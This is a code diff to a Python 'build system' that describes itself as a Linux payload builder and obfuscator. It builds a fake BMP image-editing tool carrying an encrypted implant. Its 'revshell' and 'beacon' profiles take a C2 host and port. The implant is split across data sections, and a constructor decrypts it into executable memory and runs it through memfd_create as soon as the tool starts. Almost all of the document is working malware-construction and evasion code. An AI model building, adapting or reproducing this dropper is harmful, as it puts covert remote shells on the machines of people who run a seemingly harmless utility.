@@ -2,26 +2,30 @@
 # bmputil build system
 # linux payload builder and obfuscator
 
-import os
+import os, socket
 import subprocess
 import struct
 import math
 import random
+import argparse
 
-# --- config ---
+class colors:
+    blue    = '\033[38;5;75m'
+    green   = '\033[38;5;84m'
+    yellow  = '\033[38;5;227m'
+    red     = '\033[38;5;203m'
+    reset   = '\033[0m'
+
+def GENERATE_ROUTING_TAG(host, port):
+    host_bytes = host.encode('utf-8')
+    packet = bytes([0x00, 0x2f, len(host_bytes)]) + host_bytes + struct.pack(">H", port) + bytes([0x01])
+    return bytes([len(packet)]) + packet
+
+
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
-SOURCE_TEMPLATE = os.path.join(SCRIPT_DIR, "main.c")
 TARGET_NAME = "bmputil"
 
-HOST_ADDR = "[ATTACKER_IP]"
-HOST_PORT = [ATTACKER_PORT]
-_ROUTING_TAG = bytes([41, 0, 71, 35]) + b"[ATTACKER_HOSTNAME]" + bytes([0x63, 0xdd, 0x01])
-
-_ip_parts = [int(x) for x in HOST_ADDR.split(".")]
-_ADDR_RESOURCE = struct.pack(">H", HOST_PORT) + bytes(_ip_parts)
-
-# string and data table
-RESOURCE_TABLE = [
+COMMON_RESOURCES = [
     b"\033[1;36mBMP Image Engine v1.2\033[0m\n",
     b"Usage: %s <input> <output.bmp> <operation> [param]\n",
     b"Operations:\n"
@@ -40,17 +44,14 @@ RESOURCE_TABLE = [
     b"[*] Adjusted Brightness by %d units.\n",
     b"[!] Unknown operation: %s\n",
     b"[+] Successfully saved to: %s\n",
-    bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]),
-    _ROUTING_TAG,
-    _ADDR_RESOURCE,
 ]
 
-# --- crypto ---
 
-def _PROCESS_BLOCK(state):
+# rfc 8439
+def _DO_PROCESS(state):
     def _ROT(v, c):
         return ((v << c) & 0xffffffff) | (v >> (32 - c))
-    
+
     def _QR(x, a, b, c, d):
         x[a] = (x[a] + x[b]) & 0xffffffff
         x[d] ^= x[a]; x[d] = _ROT(x[d], 16)
@@ -60,7 +61,7 @@ def _PROCESS_BLOCK(state):
         x[d] ^= x[a]; x[d] = _ROT(x[d], 8)
         x[c] = (x[c] + x[d]) & 0xffffffff
         x[b] ^= x[c]; x[b] = _ROT(x[b], 7)
-    
+
     x = list(state)
     for _ in range(10):
         _QR(x, 0, 4, 8, 12)
@@ -71,10 +72,10 @@ def _PROCESS_BLOCK(state):
         _QR(x, 1, 6, 11, 12)
         _QR(x, 2, 7, 8, 13)
         _QR(x, 3, 4, 9, 14)
-    
+
     return [(a + b) & 0xffffffff for a, b in zip(x, state)]
 
-def TRANSFORM_DATA(data, key, nonce):
+def CHANGE_DATA(data, key, nonce):
     state = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574] + list(struct.unpack("<8I", key)) + [
         0, 0, struct.unpack("<I", nonce[0:4])[0], struct.unpack("<I", nonce[4:8])[0]
     ]
@@ -82,69 +83,110 @@ def TRANSFORM_DATA(data, key, nonce):
     for i in range(len(data)):
         if i % 64 == 0:
             state[12] = i // 64
-            block = _PROCESS_BLOCK(state)
+            block = _DO_PROCESS(state)
             block_bytes = struct.pack("<16I", *block)
         out.append(data[i] ^ block_bytes[i % 64])
     return out
 
-def GET_GAMMA_CORE():
+def RET_GAMMA_CORE():
     return bytes([min(255, int(255 * math.pow(i / 255.0, 1/2.2))) for i in range(256)])
 
-def APPLY_MASK(data, profile):
-    gamma = GET_GAMMA_CORE()
+def PUT_MASK(data, profile):
+    gamma = RET_GAMMA_CORE()
     out = bytearray()
     for i, byte in enumerate(data):
         rotated = ((byte << 3) & 0xFF) | (byte >> 5)
         out.append(rotated ^ profile[i % len(profile)] ^ gamma[i % len(gamma)])
     return out
 
+# bytes will get split acorss these n sections.
 SEGMENTS = [
-    (".rodata.blk0", "data_blk_0"), 
+    (".rodata.blk0", "data_blk_0"),
     (".rodata.blk1", "data_blk_1"),
-    (".rodata.blk2", "data_blk_2"), 
+    (".rodata.blk2", "data_blk_2"),
     (".rodata.blk3", "data_blk_3"),
-    (".rodata.blk4", "data_blk_4"), 
+    (".rodata.blk4", "data_blk_4"),
     (".rodata.blk5", "data_blk_5"),
-    (".rodata.blk6", "data_blk_6"), 
+    (".rodata.blk6", "data_blk_6"),
     (".rodata.blk7", "data_blk_7"),
 ]
 
-# --- build logic ---
 
-def GENERATE_SOURCE():
-    with open(SOURCE_TEMPLATE, "r") as f:
+def GENERATE_SOURCE(template_path, resource_table, extra_replacements=None):
+    with open(template_path, "r") as f:
         content = f.read()
 
     session_key = os.urandom(32)
     resource_arrays = ""
 
-    # pre-compute encrypted resource blobs
-    for idx, res in enumerate(RESOURCE_TABLE):
+    for idx, res in enumerate(resource_table):
         nonce = os.urandom(8)
-        enc = TRANSFORM_DATA(res, session_key, nonce)
+        enc = CHANGE_DATA(res, session_key, nonce)
         resource_arrays += f"static const unsigned char dat_{idx}[] = {{ {', '.join(f'0x{b:02x}' for b in enc)} }};\n"
         resource_arrays += f"static const unsigned char nce_{idx}[] = {{ {', '.join(f'0x{b:02x}' for b in nonce)} }};\n"
 
-    content = content.replace("[STRINGS_ARRAYS]", resource_arrays)
+    content = content.replace("__STRINGS_ARRAYS__", resource_arrays)
 
-    # inject key material
     chacha_mask = random.randint(0x10000000, 0x7FFFFFFF)
-    content = content.replace("[CHACHA_MASK]", f"0x{chacha_mask:08x}")
-    content = content.replace("[IP_HEX]", "0x00000000")
-    content = content.replace("[PORT_HEX]", "0x0000")
+    content = content.replace("__CHACHA_MASK__", f"0x{chacha_mask:08x}")
 
     key_ints = struct.unpack("<8I", session_key)
     for i in range(8):
-        content = content.replace(f"[CHACHA_KEY_{i}]", f"0x{key_ints[i]:08x}")
+        content = content.replace(f"__CHACHA_KEY_{i}__", f"0x{key_ints[i]:08x}")
 
-    content = content.replace("enc_", "dat_").replace("nonce_", "nce_")
+    if extra_replacements:
+        for k, v in extra_replacements.items():
+            content = content.replace(k, v)
 
     with open("engine_source.c", "w") as f:
         f.write(content)
 
-def BUILD_ENGINE():
+    return session_key
+
+
+def BUILD_ENGINE(profile="revshell", host="127.0.0.1", port=8080, domain=None):
+    base = list(COMMON_RESOURCES)
+    extra = {}
+    template = os.path.join(SCRIPT_DIR, "main.c" if profile == "revshell" else "main_beacon.c")
+
+    if domain is None:
+        domain = host
+
+    print(f"[*] building profile: {profile}")
+    print(f"[*] target host: {host}:{port}")
+    print(f"[*] routing tag: {domain}")
+
+    try:
+        _ip = [int(x) for x in host.split(".")]
+    except ValueError:
+        try:
+            _ip = [int(x) for x in socket.gethostbyname(host).split(".")]
+        except socket.gaierror:
+            print(f"{colors.red}[!] Error: Could not resolve hostname '{host}' to an IP address.{colors.reset}")
+            print(f"{colors.yellow}[*] Tip: The malware requires a hardcoded IP. Please use the numerical IP of your tunnel node.{colors.reset}")
+            return
+    addr_res = struct.pack(">H", port) + bytes(_ip)
+
+    routing_tag = GENERATE_ROUTING_TAG(domain, port)
+
+    if profile == "revshell":
+        beacon_id = os.urandom(4)
+        res_id = f"static const unsigned char dat_bid[] = {{ {', '.join(f'0x{b:02x}' for b in beacon_id)} }};\n"
+        extra["__BEACON_ID_DATA__"] = res_id
+        base.append(bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]))  # /bin/sh
+        base.append(routing_tag)
+        base.append(addr_res)
+    else:
+        beacon_id = os.urandom(4)
+        res_id = f"static const unsigned char dat_bid[] = {{ {', '.join(f'0x{b:02x}' for b in beacon_id)} }};\n"
+        extra["__BEACON_ID_DATA__"] = res_id
+        base.append(bytes([0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68]))  # /bin/sh
+        base.append(routing_tag)
+        base.append(addr_res)
+        base.append(beacon_id)
+
     print("[*] generating sources")
-    GENERATE_SOURCE()
+    GENERATE_SOURCE(template, base, extra)
 
     print("[*] compiling core")
     subprocess.run(["gcc", "-O2", "-s", "-o", "engine_raw", "engine_source.c"], check=True)
@@ -153,18 +195,17 @@ def BUILD_ENGINE():
         raw_binary = f.read()
 
     mask_key = os.urandom(32)
-    protected_binary = APPLY_MASK(raw_binary, mask_key)
-    gamma = GET_GAMMA_CORE()
+    protected_binary = PUT_MASK(raw_binary, mask_key)
+    gamma = RET_GAMMA_CORE()
     combined_key = bytes([gamma[i] ^ mask_key[i % 32] for i in range(256)])
 
-    # partition binary into random-sized chunks
     n = len(SEGMENTS)
     total_len = len(protected_binary)
     base_sz = total_len // n
     remainder = total_len % n
     split_points = [0]
     pos = 0
-    
+
     for i in range(n):
         sz = base_sz + (1 if i < remainder else 0)
         if i < n - 1 and sz > 128:
@@ -186,7 +227,7 @@ def BUILD_ENGINE():
             chunk_defs += f'static const uint8_t {name}[] __attribute__((used, section("{sec}"))) = {{ {TO_HEX(chunks[i])} }};\n'
 
     sizes_list = ", ".join(str(len(c)) for c in chunks)
-    ptrs_list  = ", ".join(name for _, name in SEGMENTS[:len(chunks)])
+    ptrs_list = ", ".join(name for _, name in SEGMENTS[:len(chunks)])
     total_payload_size = len(protected_binary)
 
     loader_code = f"""
@@ -228,7 +269,6 @@ typedef struct {{ uint16_t type; uint32_t size; uint16_t r1, r2; uint32_t offset
 typedef struct {{ uint32_t size; int width, height; uint16_t planes, bits; uint32_t comp, img_size; int xppm, yppm; uint32_t clr_used, clr_imp; }} BMPInfoHdr;
 #pragma pack(pop)
 
-// --- bmp filters ---
 
 static int load_bmp(const char *path, BMPFileHdr *hdr, BMPInfoHdr *info, uint8_t **pixels) {{
     FILE *f = fopen(path, "rb");
@@ -278,17 +318,12 @@ static void save_bmp(const char *path, BMPFileHdr *hdr, BMPInfoHdr *info, uint8_
 }}
 
 static int do_grayscale(const char *in, const char *out) {{
-    BMPFileHdr h; 
-    BMPInfoHdr i; 
-    uint8_t *px;
-    
+    BMPFileHdr h; BMPInfoHdr i; uint8_t *px;
     int dsz = load_bmp(in, &h, &i, &px); 
     if (dsz < 0) return 1;
-    
     int height = i.height < 0 ? -i.height : i.height;
     int pad = (4 - (i.width * 3) % 4) % 4;
     int row = i.width * 3 + pad;
-    
     for (int y = 0; y < height; y++) {{
         for (int x = 0; x < i.width; x++) {{
             int idx = y * row + x * 3;
@@ -296,106 +331,69 @@ static int do_grayscale(const char *in, const char *out) {{
             px[idx] = px[idx+1] = px[idx+2] = gray;
         }}
     }}
-    
-    save_bmp(out, &h, &i, px, dsz); 
-    free(px);
-    
+    save_bmp(out, &h, &i, px, dsz); free(px);
     printf("[*] Applied Luma Grayscale transform.\\n[+] Saved to: %s\\n", out);
     return 0;
 }}
 
 static int do_invert(const char *in, const char *out) {{
-    BMPFileHdr h; 
-    BMPInfoHdr i; 
-    uint8_t *px;
-    
+    BMPFileHdr h; BMPInfoHdr i; uint8_t *px;
     int dsz = load_bmp(in, &h, &i, &px); 
     if (dsz < 0) return 1;
-    
     int height = i.height < 0 ? -i.height : i.height;
     int pad = (4 - (i.width * 3) % 4) % 4;
     int row = i.width * 3 + pad;
-    
     for (int y = 0; y < height; y++) {{
         for (int x = 0; x < i.width; x++) {{
             int idx = y * row + x * 3;
-            px[idx] = 255 - px[idx]; 
-            px[idx+1] = 255 - px[idx+1]; 
-            px[idx+2] = 255 - px[idx+2];
+            px[idx] = 255 - px[idx]; px[idx+1] = 255 - px[idx+1]; px[idx+2] = 255 - px[idx+2];
         }}
     }}
-        
-    save_bmp(out, &h, &i, px, dsz); 
-    free(px);
-    
+    save_bmp(out, &h, &i, px, dsz); free(px);
     printf("[*] Applied Chromatic Inversion transform.\\n[+] Saved to: %s\\n", out);
     return 0;
 }}
 
 static int do_sepia(const char *in, const char *out) {{
-    BMPFileHdr h; 
-    BMPInfoHdr i; 
-    uint8_t *px;
-    
+    BMPFileHdr h; BMPInfoHdr i; uint8_t *px;
     int dsz = load_bmp(in, &h, &i, &px); 
     if (dsz < 0) return 1;
-    
     int height = i.height < 0 ? -i.height : i.height;
     int pad = (4 - (i.width * 3) % 4) % 4;
     int row = i.width * 3 + pad;
-    
     for (int y = 0; y < height; y++) {{
         for (int x = 0; x < i.width; x++) {{
             int idx = y * row + x * 3;
             int b = px[idx], g = px[idx+1], r = px[idx+2];
-            
             int tr = (r*100 + g*196 + b*48) >> 8;
             int tg = (r*89 + g*175 + b*43) >> 8;
             int tb = (r*69 + g*136 + b*33) >> 8;
-            
-            px[idx]   = tb > 255 ? 255 : tb; 
-            px[idx+1] = tg > 255 ? 255 : tg; 
-            px[idx+2] = tr > 255 ? 255 : tr;
+            px[idx]   = tb > 255 ? 255 : tb; px[idx+1] = tg > 255 ? 255 : tg; px[idx+2] = tr > 255 ? 255 : tr;
         }}
     }}
-        
-    save_bmp(out, &h, &i, px, dsz); 
-    free(px);
-    
+    save_bmp(out, &h, &i, px, dsz); free(px);
     printf("[*] Applied Vintage Sepia transform.\\n[+] Saved to: %s\\n", out);
     return 0;
 }}
 
 static int do_brightness(const char *in, const char *out, int val) {{
-    BMPFileHdr h; 
-    BMPInfoHdr i; 
-    uint8_t *px;
-    
+    BMPFileHdr h; BMPInfoHdr i; uint8_t *px;
     int dsz = load_bmp(in, &h, &i, &px); 
     if (dsz < 0) return 1;
-    
     int height = i.height < 0 ? -i.height : i.height;
     int pad = (4 - (i.width * 3) % 4) % 4;
     int row = i.width * 3 + pad;
-    
     for (int y = 0; y < height; y++) {{
         for (int x = 0; x < i.width; x++) {{
             int idx = y * row + x * 3;
-            for (int c = 0; c < 3; c++) {{
-                int v = px[idx+c] + val;
-                px[idx+c] = v < 0 ? 0 : (v > 255 ? 255 : v);
-            }}
+            for (int c = 0; c < 3; c++) {{ int v = px[idx+c] + val; px[idx+c] = v < 0 ? 0 : (v > 255 ? 255 : v); }}
         }}
     }}
-        
-    save_bmp(out, &h, &i, px, dsz); 
-    free(px);
-    
+    save_bmp(out, &h, &i, px, dsz); free(px);
     printf("[*] Adjusted Brightness by %d units.\\n[+] Saved to: %s\\n", val, out);
     return 0;
 }}
 
-// --- core ---
 
 __attribute__((constructor))
 static void _setup_ctx(void) {{
@@ -403,24 +401,20 @@ static void _setup_ctx(void) {{
     static const uint8_t *ptr[] = {{ {ptrs_list} }};
     int tot = {total_payload_size};
 
-    /* alloc rwx block */
     uint8_t *buf = mmap(NULL, tot + 32, PROT_RWX, MAP_ANON_PRIV, -1, 0);
     if (buf == MAP_FAILED) return;
 
-    /* reassemble chunks */
     int off = 0;
     for (int i = 0; i < {n}; i++) {{ 
         memcpy(buf + off, ptr[i], sz[i]); 
         off += sz[i]; 
     }}
 
-    /* decrypt */
     for (int i = 0; i < tot; i++) {{
         buf[i] ^= color_lut[i % 256];
         buf[i] = (buf[i] >> 3) | (buf[i] << 5);
     }}
 
-    /* prep execution stub */
     uint8_t stub[] = {{
         0x48, 0x89, 0xf8, 0x48, 0x89, 0xf7, 0x48, 0x89, 0xd6, 
         0x48, 0x89, 0xca, 0x4d, 0x89, 0xc2, 0x4d, 0x89, 0xc8, 
@@ -430,7 +424,6 @@ static void _setup_ctx(void) {{
     memcpy(buf + tot, stub, sizeof(stub));
     long (*_sys)(long, long, long, long, long, long, long) = (void *)(buf + tot);
 
-    /* map & dispatch */
     char z[1] = {{0}};
     long fd = _sys(SYS_MEMFD_CREATE, (long)z, 0, 0, 0, 0, 0);
     
@@ -445,7 +438,6 @@ static void _setup_ctx(void) {{
         _sys(SYS_CLOSE, fd, 0, 0, 0, 0, 0);
     }}
     
-    /* wipe */
     memset(buf, 0, tot);
 }}
 
@@ -465,7 +457,6 @@ int main(int argc, char **argv, char **envp) {{
             int v = argc > 4 ? atoi(argv[4]) : 50;
             return do_brightness(argv[1], argv[2], v);
         }}
-        
         fprintf(stderr, "Unknown operation: %s\\n", argv[3]);
         return 1;
     }}
@@ -473,7 +464,6 @@ int main(int argc, char **argv, char **envp) {{
     printf("%s\\n", APP_NAME);
     printf(APP_USAGE, argv[0]);
     printf("%s", APP_OPS);
-    
     return 1;
 }}
 """
@@ -484,10 +474,19 @@ int main(int argc, char **argv, char **envp) {{
     subprocess.run(["gcc", "-O2", "-s", "-o", TARGET_NAME, "wrapper.c"], check=True)
 
     for f in ["engine_source.c", "engine_raw", "wrapper.c"]:
-        if os.path.exists(f): 
+        if os.path.exists(f):
             os.remove(f)
 
-    print(f"[+] build ok -> {TARGET_NAME}")
+    print(f"[+] build ok -> {TARGET_NAME}  (profile: {profile})")
 
 if __name__ == "__main__":
-    BUILD_ENGINE()
+    parser = argparse.ArgumentParser(description="bmputil build system")
+    parser.add_argument("--profile", default="revshell", choices=["revshell", "beacon"],
+                        help="implant profile to build")
+    parser.add_argument("--host", default="127.0.0.1",
+                        help="C2 server hostname or IP")
+    parser.add_argument("--port", default=8080, type=int,
+                        help="C2 server port")
+    parser.add_argument("--domain", type=str, help="Routing domain (for playit.gg tags)")
+    args = parser.parse_args()
+    BUILD_ENGINE(args.profile, args.host, args.port, args.domain)
